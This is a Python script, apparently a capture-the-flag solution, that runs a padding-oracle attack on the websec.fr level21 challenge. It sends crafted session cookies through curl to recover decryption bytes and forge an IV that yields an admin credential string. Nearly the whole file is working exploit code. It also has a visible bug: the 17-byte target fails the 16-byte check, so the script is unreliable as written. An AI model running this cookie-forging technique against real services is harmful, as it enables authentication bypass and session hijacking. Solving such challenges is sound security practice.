#!/usr/bin/env python3
"""
Usando padding oracle para CIFRAR un plaintext arbitrario
"""
import binascii
import subprocess

def oracle(cookie_hex):
    """Retorna True si el padding es válido"""
    cmd = f'timeout 6s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_hex}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return "Wrong" in result.stdout or (len(result.stdout) > 1300 and "corrupted" not in result.stdout)

def encrypt_block(plaintext_block, oracle_func):
    """
    Cifra un bloque de plaintext usando padding oracle
    Retorna el bloque previo (IV o CT) necesario para producir este plaintext
    """
    if len(plaintext_block) != 16:
        raise ValueError("Block must be 16 bytes")
    
    # Necesitamos encontrar un "previous block" (IV o CT previo) tal que
    # cuando se XOR con D(K, CT_conocido), produzca nuestro plaintext deseado
    
    # Usaremos un CT conocido (puede ser cualquiera, usaremos ceros)
    ct_dummy = bytearray(16)  # Todo ceros
    
    # Ahora necesitamos descubrir D(K, ct_dummy) usando el oracle
    # Luego calcularemos: prev_block = D(K, ct_dummy) XOR plaintext_desired
    
    print(f"Cifrando bloque: {plaintext_block}")
    
    intermediate = bytearray(16)  # D(K, CT)
    
    # Para cada byte (de derecha a izquierda)
    for pad_val in range(1, 17):
        pos = 16 - pad_val
        print(f"  Encontrando byte {pos}...", end='', flush=True)
        
        # Construir IV de prueba
        test_iv = bytearray(16)
        
        # Setear bytes ya conocidos
        for k in range(pad_val - 1):
            test_iv[16 - 1 - k] = intermediate[16 - 1 - k] ^ pad_val
        
        # Probar valores para el byte actual
        for guess in range(256):
            test_iv[pos] = guess
            
            test_cookie = binascii.hexlify(test_iv).decode() + binascii.hexlify(ct_dummy).decode()
            
            if oracle_func(test_cookie):
                # Padding válido!
                intermediate[pos] = guess ^ pad_val
                print(f" 0x{intermediate[pos]:02x}")
                break
        else:
            print(f" FAILED")
            return None
    
    # Ahora calculamos el IV/prev_block necesario
    prev_block = bytearray(16)
    for i in range(16):
        prev_block[i] = intermediate[i] ^ plaintext_block[i]
    
    return bytes(prev_block)

print("=== CIFRADO CON PADDING ORACLE ===\n")
print("Objetivo: Cifrar 'user/pass:admin\\x00/'\n")

# El plaintext que queremos
target_plaintext = b"user/pass:admin\x00/"

# Necesitamos 16 bytes
if len(target_plaintext) < 16:
    target_plaintext = target_plaintext + b'\x00' * (16 - len(target_plaintext))

print(f"Target: {target_plaintext} ({len(target_plaintext)} bytes)\n")

# Cifrar este bloque
prev_block = encrypt_block(target_plaintext, oracle)

if prev_block:
    print(f"\n✓ IV necesario: {binascii.hexlify(prev_block).decode()}")
    print(f"\nEste IV con cualquier CT producirá el plaintext deseado en bloque 0")
else:
    print(f"\n✗ Fallo al cifrar")

